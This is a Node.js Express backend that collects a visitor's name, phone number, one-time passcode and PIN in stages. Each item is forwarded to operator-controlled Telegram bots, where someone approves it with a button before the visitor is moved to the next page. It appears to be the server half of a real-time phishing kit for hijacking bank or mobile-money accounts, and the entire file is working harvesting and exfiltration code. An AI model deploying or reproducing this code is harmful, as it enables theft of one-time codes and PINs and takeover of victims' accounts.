require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');

const app = express();
const PORT = process.env.PORT || 10000;
const DOMAIN = process.env.BACKEND_DOMAIN;

// ---------- IN-MEMORY STORES ----------
const phoneRequests = {};
const otpRequests = {};
const pinRequests = {};
const requestMeta = {};

// ---------- BOTS ----------
const bots = [];
Object.keys(process.env).forEach(key => {
  const match = key.match(/^BOT(\d+)_TOKEN$/);
  if (!match) return;
  const i = match[1];
  const token = process.env[`BOT${i}_TOKEN`];
  const chatId = process.env[`BOT${i}_CHATID`];
  if (token && chatId) bots.push({ botId: `bot${i}`, token, chatId });
});
console.log('✅ Bots loaded:', bots.map(b => b.botId));

// ---------- MIDDLEWARE ----------
app.use(express.json({ type: '*/*' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// ---------- HELPERS ----------
function getBot(botId) {
  return bots.find(b => b.botId === botId);
}

async function sendTelegram(bot, text, buttons = []) {
  try {
    const res = await axios.post(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
      chat_id: bot.chatId,
      text,
      reply_markup: buttons.length ? { inline_keyboard: buttons } : undefined
    });
    return res.data.result; // contains message_id
  } catch (e) {
    console.error('❌ Telegram sendMessage error:', e.response?.data || e.message);
    return null;
  }
}

async function answerCallback(bot, id, text = '') {
  try {
    await axios.post(
      `https://api.telegram.org/bot${bot.token}/answerCallbackQuery`,
      { callback_query_id: id, text }
    );
  } catch (e) {
    console.error('❌ answerCallbackQuery error:', e.response?.data || e.message);
  }
}

/**
 * Remove inline buttons from a message.
 * Strategy:
 *   1) Try editMessageReplyMarkup with empty inline_keyboard.
 *   2) If that fails, try editMessageText keeping the original text but no markup.
 * Logs the exact Telegram error so you can see why it failed.
 */
async function removeButtons(bot, chatId, messageId, originalText) {
  // Attempt 1: remove only the reply markup
  try {
    const r = await axios.post(
      `https://api.telegram.org/bot${bot.token}/editMessageReplyMarkup`,
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: { inline_keyboard: [] }
      }
    );
    console.log(`✅ Buttons removed (msg ${messageId})`, r.data.ok);
    return true;
  } catch (e) {
    const desc = e.response?.data?.description || e.message;
    console.warn(`⚠️ editMessageReplyMarkup failed (msg ${messageId}):`, desc);

    // "message is not modified" means buttons already gone → success
    if (desc.includes('message is not modified')) return true;
  }

  // Attempt 2: edit the whole message text with no markup
  if (originalText) {
    try {
      const r = await axios.post(
        `https://api.telegram.org/bot${bot.token}/editMessageText`,
        {
          chat_id: chatId,
          message_id: messageId,
          text: originalText,
          reply_markup: { inline_keyboard: [] }
        }
      );
      console.log(`✅ Buttons removed via editMessageText (msg ${messageId})`, r.data.ok);
      return true;
    } catch (e) {
      const desc = e.response?.data?.description || e.message;
      console.error(`❌ editMessageText fallback failed (msg ${messageId}):`, desc);
    }
  }

  return false;
}

// ---------- WEBHOOKS ----------
async function setWebhook(bot) {
  if (!DOMAIN) {
    console.warn('⚠️ BACKEND_DOMAIN not set — skipping webhook setup');
    return;
  }
  const url = `${DOMAIN}/telegram-webhook/${bot.botId}`;
  try {
    const r = await axios.get(
      `https://api.telegram.org/bot${bot.token}/setWebhook`,
      { params: { url } }
    );
    if (r.data.ok) console.log(`✅ Webhook set for ${bot.botId} → ${url}`);
    else console.error(`❌ Webhook rejected for ${bot.botId}:`, r.data);
  } catch (e) {
    console.error('❌ Webhook error:', e.response?.data || e.message);
  }
}

async function setAllWebhooks() {
  for (const bot of bots) await setWebhook(bot);
}

// ---------- PHONE STEP ----------
app.post('/submit-phone', (req, res) => {
  try {
    const { name, phone, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    phoneRequests[requestId] = null;
    requestMeta[requestId] = { name, phone, botId };

    sendTelegram(
      bot,
      `📱 PHONE VERIFICATION
👤 Name: ${name}
📞 Phone: ${phone}
🆔 Ref: ${requestId}`,
      [
        [
          { text: '✅ Approve', callback_data: `phone_ok:${requestId}` },
          { text: '❌ Reject', callback_data: `phone_bad:${requestId}` }
        ]
      ]
    );

    res.json({ requestId });
  } catch {
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/check-phone/:id', (req, res) => {
  const result = phoneRequests[req.params.id];
  if (result === true) return res.json({ redirect: 'code.html' });
  if (result === false) return res.json({ approved: false });
  res.json({ approved: null });
});

// ---------- OTP STEP ----------
app.post('/submit-otp', (req, res) => {
  try {
    const { name, phone, otp, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    otpRequests[requestId] = null;
    requestMeta[requestId] = { name, phone, botId };

    sendTelegram(
      bot,
      `🔐 OTP VERIFICATION
👤 Name: ${name}
📞 Phone: ${phone}
🔢 OTP: ${otp}
🆔 Ref: ${requestId}`,
      [
        [
          { text: '✅ Correct OTP', callback_data: `otp_ok:${requestId}` },
          { text: '❌ Wrong OTP', callback_data: `otp_bad:${requestId}` }
        ]
      ]
    );

    res.json({ requestId });
  } catch {
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/check-otp/:id', (req, res) => {
  res.json({ approved: otpRequests[req.params.id] ?? null });
});

// ---------- PIN STEP ----------
app.post('/submit-pin', (req, res) => {
  try {
    const { name, phone, pin, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    pinRequests[requestId] = null;
    requestMeta[requestId] = { name, phone, botId };

    sendTelegram(
      bot,
      `🔐 PIN VERIFICATION
👤 Name: ${name}
📞 Phone: ${phone}
🔢 PIN: ${pin}
🆔 Ref: ${requestId}`,
      [
        [
          { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
          { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` }
        ]
      ]
    );

    res.json({ requestId });
  } catch {
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/check-pin/:id', (req, res) => {
  res.json({ approved: pinRequests[req.params.id] ?? null });
});

// ---------- TELEGRAM CALLBACK WEBHOOK ----------
app.post('/telegram-webhook/:botId', async (req, res) => {
  const bot = getBot(req.params.botId);
  if (!bot) return res.sendStatus(404);

  const cb = req.body.callback_query;
  if (!cb) return res.sendStatus(200);

  // Acknowledge immediately so Telegram doesn't retry
  await answerCallback(bot, cb.id);

  const [action, requestId] = cb.data.split(':');
  const meta = requestMeta[requestId];

  // ✅ Remove buttons FIRST so they can't be clicked again
  if (cb.message) {
    const originalText = cb.message.text || '';
    const removed = await removeButtons(
      bot,
      cb.message.chat.id,
      cb.message.message_id,
      originalText
    );
    if (!removed) {
      console.error(
        `❌ Could not remove buttons for msg ${cb.message.message_id}. ` +
        `Make sure the bot is admin/owner of the chat and the message is not too old (<48h).`
      );
    }
  } else {
    console.warn('⚠️ callback_query has no message — cannot remove buttons');
  }

  let feedback = '';

  // Phone decisions
  if (action === 'phone_ok') {
    phoneRequests[requestId] = true;
    feedback = '✅ Phone approved – redirecting to OTP page';
  }
  if (action === 'phone_bad') {
    phoneRequests[requestId] = false;
    feedback = '❌ Phone rejected';
  }

  // OTP decisions
  if (action === 'otp_ok') {
    otpRequests[requestId] = true;
    feedback = '✅ OTP approved – redirecting to PIN page';
  }
  if (action === 'otp_bad') {
    otpRequests[requestId] = false;
    feedback = '❌ OTP rejected';
  }

  // PIN decisions
  if (action === 'pin_ok') {
    pinRequests[requestId] = true;
    feedback = '✅ PIN approved – redirecting to success page';
  }
  if (action === 'pin_bad') {
    pinRequests[requestId] = false;
    feedback = '❌ PIN rejected';
  }

  if (feedback && meta) {
    await sendTelegram(
      bot,
      `📝 ACTION TAKEN
👤 Name: ${meta.name || '—'}
📞 Phone: ${meta.phone || '—'}
${feedback}`
    );
  }

  res.sendStatus(200);
});

// ---------- BOT ENTRY POINT ----------
app.get('/bot/:botId', (req, res) => {
  const bot = bots.find(b => b.botId === req.params.botId);
  if (!bot) return res.status(404).send('Invalid bot');
  res.redirect(`/index.html?botId=${bot.botId}`);
});

// ---------- DEBUG (optional) ----------
app.get('/debug/bot', (req, res) => {
  res.json({
    count: bots.length,
    bots: bots.map(b => ({ botId: b.botId, chatId: b.chatId })),
    domain: DOMAIN || null
  });
});

// ---------- START SERVER ----------
setAllWebhooks().then(() => {
  app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
});